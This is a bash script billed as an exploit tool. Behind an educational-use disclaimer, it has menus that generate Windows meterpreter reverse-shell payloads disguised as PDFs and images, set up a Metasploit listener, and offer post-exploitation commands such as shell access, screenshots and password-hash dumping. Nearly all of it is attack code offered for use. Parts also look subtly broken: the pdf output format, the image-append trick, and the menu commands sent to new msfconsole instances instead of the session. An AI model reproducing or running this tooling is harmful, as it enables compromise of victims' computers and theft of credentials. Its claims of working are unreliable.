#!/bin/bash

# Exploit Script for PDF and Image Payloads with Post-Exploitation Menu
# DISCLAIMER: Use this script only for educational purposes on systems you own or have explicit permission to test.

function generate_payload_pdf {
    echo "============================"
    echo "   PDF Payload Generator"
    echo "============================"
    read -p "Enter your IP address (LHOST): " LHOST
    read -p "Enter the port to listen on (LPORT): " LPORT
    echo "[*] Generating malicious PDF payload..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f pdf > exploit.pdf

    if [[ -f "exploit.pdf" ]]; then
        echo "[*] Malicious PDF created: exploit.pdf"
    else
        echo "[!] Failed to generate PDF. Check msfvenom installation."
    fi
}

function inject_payload_into_custom_pdf {
    echo "============================"
    echo "   Custom PDF Injector"
    echo "============================"
    read -p "Enter the path to your custom PDF: " custom_pdf
    if [[ ! -f "$custom_pdf" ]]; then
        echo "[!] File not found. Please provide a valid PDF file path."
        return
    fi
    read -p "Enter your IP address (LHOST): " LHOST
    read -p "Enter the port to listen on (LPORT): " LPORT
    echo "[*] Injecting payload into $custom_pdf..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f pdf -o injected.pdf -x "$custom_pdf"

    if [[ -f "injected.pdf" ]]; then
        echo "[*] Payload successfully injected: injected.pdf"
    else
        echo "[!] Failed to inject payload. Check msfvenom installation."
    fi
}

function generate_payload_image {
    echo "============================"
    echo "   Image Payload Generator"
    echo "============================"
    read -p "Enter your IP address (LHOST): " LHOST
    read -p "Enter the port to listen on (LPORT): " LPORT
    echo "[*] Generating malicious image payload..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o image_payload.exe
    echo "[*] Embedding payload into an image..."
    read -p "Enter the path to a base image (JPEG/PNG): " base_image
    if [[ ! -f "$base_image" ]]; then
        echo "[!] File not found. Please provide a valid image path."
        return
    fi
    cat "$base_image" image_payload.exe > malicious_image.jpg
    if [[ -f "malicious_image.jpg" ]]; then
        echo "[*] Malicious image created: malicious_image.jpg"
    else
        echo "[!] Failed to create malicious image."
    fi
}

function inject_payload_into_custom_image {
    echo "============================"
    echo "   Custom Image Injector"
    echo "============================"
    read -p "Enter the path to your custom image (JPEG/PNG): " custom_image
    if [[ ! -f "$custom_image" ]]; then
        echo "[!] File not found. Please provide a valid image path."
        return
    fi
    read -p "Enter your IP address (LHOST): " LHOST
    read -p "Enter the port to listen on (LPORT): " LPORT
    echo "[*] Generating payload..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o custom_image_payload.exe
    echo "[*] Injecting payload into $custom_image..."
    cat "$custom_image" custom_image_payload.exe > injected_image.jpg
    if [[ -f "injected_image.jpg" ]]; then
        echo "[*] Payload successfully injected into custom image: injected_image.jpg"
    else
        echo "[!] Failed to inject payload into image."
    fi
}

function setup_listener {
    echo "============================"
    echo "   Metasploit Listener Setup"
    echo "============================"
    read -p "Enter your IP address (LHOST): " LHOST
    read -p "Enter the port to listen on (LPORT): " LPORT

    echo "[*] Setting up Metasploit listener..."
    cat <<EOF > listener.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exploit -j
EOF

    msfconsole -r listener.rc &
    sleep 10
    post_exploitation_menu
}

function post_exploitation_menu {
    echo "============================"
    echo "   Post-Exploitation Menu"
    echo "============================"
    echo "1. Get System Info"
    echo "2. Get User Info"
    echo "3. Open a Shell"
    echo "4. Capture a Screenshot"
    echo "5. Dump Password Hashes"
    echo "6. Get Location (Geolocation)"
    echo "7. Exit Session"
    echo "============================"

    while true; do
        read -p "Choose an option: " choice
        case $choice in
        1)
            echo "Running: sysinfo"
            echo "sysinfo" | msfconsole
            ;;
        2)
            echo "Running: getuid"
            echo "getuid" | msfconsole
            ;;
        3)
            echo "Running: shell"
            echo "shell" | msfconsole
            ;;
        4)
            echo "Running: screenshot"
            echo "screenshot" | msfconsole
            ;;
        5)
            echo "Running: hashdump"
            echo "hashdump" | msfconsole
            ;;
        6)
            echo "Running: geolocate"
            echo "geolocate" | msfconsole
            ;;
        7)
            echo "Exiting the session."
            echo "exit" | msfconsole
            break
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
        esac
    done
}

function main_menu {
    while true; do
        echo "============================"
        echo "       Main Menu"
        echo "============================"
        echo "1. Generate Malicious PDF"
        echo "2. Inject Payload into Custom PDF"
        echo "3. Generate Malicious Image"
        echo "4. Inject Payload into Custom Image"
        echo "5. Start Listener with Post-Exploitation Options"
        echo "6. Exit"
        echo "============================"
        read -p "Choose an option: " choice

        case $choice in
        1)
            generate_payload_pdf
            ;;
        2)
            inject_payload_into_custom_pdf
            ;;
        3)
            generate_payload_image
            ;;
        4)
            inject_payload_into_custom_image
            ;;
        5)
            setup_listener
            ;;
        6)
            echo "Exiting. Stay ethical!"
            exit 0
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
        esac
    done
}

# Run the main menu
main_menu
